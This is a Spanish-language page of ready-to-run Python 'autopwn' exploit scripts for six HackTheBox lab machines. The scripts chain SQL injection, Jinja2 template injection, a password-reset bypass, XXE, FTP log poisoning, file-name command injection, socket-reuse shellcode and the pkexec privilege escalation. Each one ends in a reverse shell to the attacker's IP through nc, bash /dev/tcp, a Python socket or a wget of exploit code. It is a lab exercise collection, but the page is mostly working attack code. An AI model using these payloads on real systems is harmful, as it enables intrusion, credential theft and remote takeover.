---
layout: content
---

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Hancliffe - HackTheBox</h2>

Este *Script* aprovecha la mala desinfección de un programa para inyectar *shellcode* y ganar un Shell inverso abusando de la reutilización de *sockets* por un límite de *buffer* definido muy pequeño.

```python
#!/usr/bin/python3

from pwn import *
from sys import argv
from time import sleep

class Exploit():

	def __init__(self, user, password, name):
		self.__user = user
		self.__password = password
		self.__name = name

	def socket_reuse(self):
	
		"""
		int recv(
  			[in]  SOCKET s, 0x
  			[out] char   *buf, -> 0x00be40f0
  			[in]  int    len, ->  0x00000410 
  			[in]  int    flags -> 0x00000000
		);
		"""
		
		buf =  b""
		buf += b"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05"
		buf += b"\xef\xff\xff\xff\x48\xbb\x76\x60\xe1\x0d\x64\x8a\xf9"
		buf += b"\x28\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
		buf += b"\x8a\x28\x62\xe9\x94\x62\x39\x28\x76\x60\xa0\x5c\x25"
		buf += b"\xda\xab\x79\x20\x28\xd0\xdf\x01\xc2\x72\x7a\x16\x28"
		buf += b"\x6a\x5f\x7c\xc2\x72\x7a\x56\x28\x6a\x7f\x34\xc2\xf6"
		buf += b"\x9f\x3c\x2a\xac\x3c\xad\xc2\xc8\xe8\xda\x5c\x80\x71"
		buf += b"\x66\xa6\xd9\x69\xb7\xa9\xec\x4c\x65\x4b\x1b\xc5\x24"
		buf += b"\x21\xb0\x45\xef\xd8\xd9\xa3\x34\x5c\xa9\x0c\xb4\x01"
		buf += b"\x79\xa0\x76\x60\xe1\x45\xe1\x4a\x8d\x4f\x3e\x61\x31"
		buf += b"\x5d\xef\xc2\xe1\x6c\xfd\x20\xc1\x44\x65\x5a\x1a\x7e"
		buf += b"\x3e\x9f\x28\x4c\xef\xbe\x71\x60\x77\xb6\xac\x3c\xad"
		buf += b"\xc2\xc8\xe8\xda\x21\x20\xc4\x69\xcb\xf8\xe9\x4e\x80"
		buf += b"\x94\xfc\x28\x89\xb5\x0c\x7e\x25\xd8\xdc\x11\x52\xa1"
		buf += b"\x6c\xfd\x20\xc5\x44\x65\x5a\x9f\x69\xfd\x6c\xa9\x49"
		buf += b"\xef\xca\xe5\x61\x77\xb0\xa0\x86\x60\x02\xb1\x29\xa6"
		buf += b"\x21\xb9\x4c\x3c\xd4\xa0\x72\x37\x38\xa0\x54\x25\xd0"
		buf += b"\xb1\xab\x9a\x40\xa0\x5f\x9b\x6a\xa1\x69\x2f\x3a\xa9"
		buf += b"\x86\x76\x63\xae\xd7\x89\x9f\xbc\x44\xda\xfd\x8a\x1a"
		buf += b"\x29\x53\xd3\x0d\x64\xcb\xaf\x61\xff\x86\xa9\x8c\x88"
		buf += b"\x2a\xf8\x28\x76\x29\x68\xe8\x2d\x36\xfb\x28\x77\xdb"
		buf += b"\xeb\x07\x74\xbf\xb8\x7c\x3f\xe9\x05\x41\xed\x7b\xb8"
		buf += b"\x92\x3a\x17\xc7\x0a\x9b\x5f\xb5\xa1\x9c\x08\xe0\x0c"
		buf += b"\x64\x8a\xa0\x69\xcc\x49\x61\x66\x64\x75\x2c\x78\x26"
		buf += b"\x2d\xd0\xc4\x29\xbb\x39\x60\x89\xa0\xa9\x84\xa6\xc2"
		buf += b"\x06\xe8\x3e\xe9\x20\x4c\xde\x60\xf6\xf7\x96\x9f\x34"
		buf += b"\x45\xed\x4d\x93\x38\x37\x38\xad\x84\x86\xc2\x70\xd1"
		buf += b"\x37\xda\x78\xa8\x10\xeb\x06\xfd\x3e\xe1\x25\x4d\x66"
		buf += b"\x8a\xf9\x61\xce\x03\x8c\x69\x64\x8a\xf9\x28\x76\x21"
		buf += b"\xb1\x4c\x34\xc2\x70\xca\x21\x37\xb6\x40\x55\x4a\x93"
		buf += b"\x25\x2f\x21\xb1\xef\x98\xec\x3e\x6c\x52\x34\xe0\x0c"
		buf += b"\x2c\x07\xbd\x0c\x6e\xa6\xe1\x65\x2c\x03\x1f\x7e\x26"
		buf += b"\x21\xb1\x4c\x34\xcb\xa9\x61\x89\xa0\xa0\x5d\x2d\x75"
		buf += b"\x31\x65\xff\xa1\xad\x84\xa5\xcb\x43\x51\xba\x5f\x67"
		buf += b"\xf2\xb1\xc2\xc8\xfa\x3e\x9f\x2b\x86\x6a\xcb\x43\x20"
		buf += b"\xf1\x7d\x81\xf2\xb1\x31\x19\x35\x5c\x6a\xa0\xb7\xc2"
		buf += b"\x1f\x44\xb5\x89\xb5\xa9\x8e\xa0\xa2\xc5\x2e\x0a\x6a"
		buf += b"\x61\xf6\x84\xff\xfc\x93\x31\x73\x93\x62\x0e\x8a\xa0"
		buf += b"\x69\xff\xba\x1e\xd8\x64\x8a\xf9\x28"

		recv = b""
		recv += b"\x54" 				# -> push esp
		recv += b"\x58" 				# -> pop eax
		recv += b"\x66\x05\x30\x02" 			# -> add ax, 0x230
		recv += b"\x66\x2d\xe8\x01" 			# -> sub ax, 0x1E8
		recv += b"\x8b\x30" 				# -> mov esi, dword [eax]
		recv += b"\x83\xec\x70" 			# -> sub esp, 0x70
		recv += b"\x31\xdb" 				# -> xor ebx, ebx
		recv += b"\x53" 				# -> push ebx 
		recv += b"\x66\x81\xc3\x10\x04" 		# -> add bx, 0x410
		recv += b"\x53" 				# -> push ebx
		recv += b"\x54"					# -> push esp
		recv += b"\x5b"					# -> pop ebx
		recv += b"\x66\x83\xc3\x70"			# -> add bx, 0x70
		recv += b"\x53"					# -> push ebx
		recv += b"\x56" 				# -> push esi
		recv += b"\xa1\xac\x82\x90\x71"			# -> mov eax, [0x719082ac]
		recv += b"\xff\xd0"				# -> call eax


		payload = recv + b"\x90"*(66 - len(recv)) + p32(0x719023A8) + b"\xeb\xb8" # -> jmp $-70

		r = remote("10.10.11.115", argv[1])

		r.sendlineafter(b"Username: ",self.__user)
		r.sendlineafter(b"Password: ",self.__password)
		r.sendlineafter(b"FullName:",self.__name)	
		r.sendlineafter(b"Input Your Code:",payload)
		sleep(1)
		r.sendline(buf)

autopwn = Exploit(b'alfiansyah', b'K3r4j@@nM4j@pAh!T', 'Vickry Alfiansyah')

def main():
	autopwn.socket_reuse()

if __name__ == '__main__':
	main()
``` 


<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">GoodGames - HackTheBox</h2>

Este *Script* explota una inyección `SQL` para volcar un hash `MD5`, también se aprovecha de un `Server Side Template Injection` para derivar a la ejecución de código arbitrario mediante sentencias maliciosas de `Jinja2`.

* Acceso como `root` en `contenedor`
* Shell interactivo

```python
#!/usr/bin/python3

from pwn import *
from re import findall
import signal
from sys import exit
from requests import get,post,session

def def_handler(sig,frame):
	print("Saliendo")
	exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit():
	def __init__(self, main_url, subdomain, password):
		self.__url = main_url
		self.__subdomain = subdomain
		self.__pass = password
	
	def extract_hash(self):

		data_sqli = {
			'email': """' union select 1,2,3,password from main.user-- -""",
			'password': 'guest'
		}
		p1 = log.progress("Hash")

		r = post(self.__url+'/login', data=data_sqli)
		hash_MD5 = findall(r'<h2 class="h4">Welcome (.*?)</h2>', r.text)[0]
		
		p1.success(hash_MD5[0:32])

	def rce_ssti(self):

		s = session()
		s.verify = False 

		r = get(self.__subdomain+'/login')
		csrf_token = findall(r'<input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)">', r.text)[0]

		data_login = {
			'csrf_token': csrf_token,
			'username': 'admin',
			'password': 'superadministrator',
			'login': ''
		}

		r = s.post(self.__subdomain+'/login', data=data_login)
		# Cambiar IP por la vuestra
		# Juntar llaves de SSTI de principio y fin
		data_ssti = {
			'name': r'''{ { cycler.__init__.__globals__.os.popen("""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.78\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'""").read() } }'''
		}

		r = s.post(self.__subdomain+'/settings', data=data_ssti)

autopwn = Exploit('http://goodgames.htb', 'http://internal-administration.goodgames.htb', 'superadministrator')

def main():
	autopwn.extract_hash()
	autopwn.rce_ssti()

if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
shell.interactive()
``` 

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Horizontall - HackTheBox</h2>

Este *Script* explota un campo de reseteo de contraseña mal configurado para acceder como usuario admin y subir un *plugin* malicioso ganando un Shell inverso por `nc`, también se aprovecha del permiso `SUID` `pkexec` para escalar privilegios.

* Acceso como `root`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

# Uso: python3 -m http.server <- Ejecutar en la misma carpeta que el autopwn

from pwn import *
import sys
import requests
import signal
import urllib3
import json
import zipfile 
import shutil
import git

def def_handler(sig,frame):
	print("Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

class Exploit:

	def __init__(self, main_url, password, filename):
		self.__url = main_url
		self.__password = password
		self.__filename = filename

	def zip_file(self):
		os.system('rm -rf CVE-2021-4034 CVE-2021-4034.zip')
		git.Git('').clone('git://github.com/berdav/CVE-2021-4034.git')
		cwd = os.getcwd()
		shutil.make_archive(self.__filename, 'zip', cwd+'/'+self.__filename)

	def reset_password(self):
		s = requests.session()
		s.verify = False
		urllib3.disable_warnings()

		p1 = log.progress('Password')

		data_password = {
			'code': {'$gt':0},
			'password': self.__password,
			'passwordConfirmation': self.__password
		}

		r = s.post(self.__url+'/admin/auth/reset-password', json=data_password).text

		response = json.loads(r)
		global jwt

		jwt = response['jwt']

		if 'jwt' not in r:
			p1.failure('Not changed password')
			sys.exit(1)
		else:
			p1.success(f'[Changed password] username admin and password {self.__password}')

	def rce_starpi(self):
		header = { 'Authorization': f'Bearer {jwt}' }
		
		# Cambiar IP por la vuestra
		data_plugin = {
			'plugin': f'documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.78 443 >/tmp/f)',
			'port': '1337'
		}

		r = requests.post(self.__url+'/admin/plugins/install', json=data_plugin, headers=header)
		
autopwn = Exploit('http://api-prod.horizontall.htb', 'pass', 'CVE-2021-4034')

def main():
	autopwn.zip_file()
	autopwn.reset_password()
	autopwn.rce_starpi()
	
if __name__ == '__main__':
	try:
		threading.Thread(target=main, args=()).start()
	except Exception as e:
		log.error(str(e))

shell = listen(443, timeout=20).wait_for_connection()
# Cambiar IP por la vuestra
shell.sendline('cd /tmp; wget http://10.10.16.78:8000/CVE-2021-4034.zip > /dev/null 2>&1; unzip -q CVE-2021-4034.zip; make 2>/dev/null; ./cve-2021-4034')
shell.interactive()
```

<p> </p>

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Writer - HackTheBox</h2>

Este *Script* abusa de una mala sanitizacion en cuanto a código en `Flask` y permite ganar **ejecución remota de comandos** a través de la concatenación de código malicioso en el nombre de una imagen con extensión `.jpg`.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

import signal
from pwn import *
import requests
import urllib3
import base64
import os

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales

login_url = "http://writer.htb/administrative"
add_post = "http://writer.htb/dashboard/stories/add"
bypass_sqli = "username: ' or 1 -- //"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def main():
    # Cambiar IP por la vuestra
    payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
    payload_malicious_bytes = payload_malicious.encode('ascii')
    base64_bytes = base64.b64encode(payload_malicious_bytes)
    base64_payload_malicious = base64_bytes.decode('ascii')

    os.system(f"""touch "reverse_shell.jpg; \`echo {base64_payload_malicious} | base64 -d | bash\`;" """)

    s = requests.session()
    s.verify = False
    urllib3.disable_warnings()

    p1 = log.progress("Login")

    data_post = {
        'uname': bypass_sqli,
        'password': bypass_sqli
    }

    r = s.post(login_url, data=data_post, allow_redirects=True)

    p1.status("Success [✔]")
    p2 = log.progress("Malicious image")

    image = open(f"reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;", "rb")

    file_image = {
        "author": (None, ''),
        "title": (None, ''),
        "tagline": (None, ''),
        "image": image,
        "image_url": (None, f'file:///var/www/writer.htb/writer/static/img/reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;'),
        "content": (None, '')
    }

    r = s.post(add_post, files=file_image)
    
    p2.success("Injected payload [✔]")
    
if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">Pikaboo - HackTheBox</h2>

Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo al envenenado de logs de `FTP` y por ello ganar un Shell inverso inyectando código malicioso en los campos `user` y `password` en la autenticación.

* Acceso como `www-data`
* Shell interactivo

```python
#!/usr/bin/python3

from pwn import *
import requests
from ftplib import FTP
import ftplib

# Variables globales

main_url = "http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log"
# Cambiar IP por la vuestra
payload = """<?php system('bash -c "bash -i >& /dev/tcp/10.10.16.24/443 0>&1"'); ?>"""
lport = 443

def def_handler(sig,frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    p1 = log.progress("Payload")
    p1.status("Inyectando [*]")

    try:
        ftp = FTP("10.10.10.249")
        ftp.login(payload,payload)
    except ftplib.error_perm as error:
        p1.success("Inyectado [✔]")

    r = requests.get(main_url)

if __name__ == '__main__':

    try:
        threading.Thread(target=main, args=()).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```

<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px; text-decoration: underline #7e7676;">BountyHunter - HackTheBox</h2>

Este *Script* explota un `XML enternal entity` codificado en `base64` para poder visualizar `db.php`, este archivo contiene credenciales en texto plano, estas sirven para acceder por `SSH` haciendo uso del usuario `development`.

* Acceso como `development`
* Shell interactivo

```python
#!/usr/bin/python3
#coding: utf-8

from pwn import *
import requests
import base64
import re
from pexpect import pxssh
import html

# Variables globales
main_url = "http://10.10.11.100/tracker_diRbPr00f314.php"
#burp = {'http': 'http://127.0.0.1:8080'}
lport = 443

def def_handler(sig, frame):
    print("Saliendo...")
    sys.exit(1)
    signal.signal(signal.SIGINT, def_handler)

def main():
    username = "development"
    password = ""
    #Coficacion en base64
    xxe_payload = """<?xml  version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]> <bugreport> <title>&test;</title> <cwe>test</cwe> <cvss>test</cvss> <reward>test</reward> </bugreport>"""
    xxe_payload_bytes = xxe_payload.encode('ascii')
    base64_bytes = base64.b64encode(xxe_payload_bytes)
    base64_xxe_payload = base64_bytes.decode('ascii')

    data_post = {
        'data': base64_xxe_payload
    }

    r = requests.post(main_url, data=data_post)
    db_file = html.unescape(re.findall(r'<td>(.*?)</td>', r.text, re.DOTALL)[1]).strip()

    #Decodificacion de archivo db.php en base64
    base64_bytes = db_file.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')

    password = re.findall(r'dbpassword = "(.*?)";', message)[0]

    return password

def sshconnection(username, password):
    s = pxssh.pxssh()
    s.login('10.10.11.100', username, password)
    # Cambiar IP por la vuestra
    s.sendline("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.19 443 >/tmp/f")
    s.prompt()
    s.logout()

if __name__ == '__main__':

    password = main()
    username = main()

    try:
        threading.Thread(target=sshconnection, args=('development', password)).start()
    except Exception as e:
        log.error(str(e))

shell = listen(lport, timeout=20).wait_for_connection()
shell.interactive()
```
